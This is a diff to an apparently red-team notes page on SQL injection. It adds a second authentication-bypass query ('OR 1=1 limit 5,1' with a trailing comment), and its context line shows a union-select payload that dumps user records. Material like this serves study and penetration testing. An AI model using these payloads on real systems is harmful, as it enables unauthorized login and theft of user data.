@@ -26,7 +26,8 @@ select * from users where user_id = 1 union all select 1,(select group_concat(us
 ### Authentication Bypass
 
 ```sql
-mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99' 
+mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99'
+mysql> select * from users where user='admin' and password='blah' OR 1=1 limit 5,1 # 5f4dcc3b5aa765d61d8327deb882cf99'
 ```
 
 ![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/assets/Screenshot%20from%202018-11-17%2016-16-06.png)
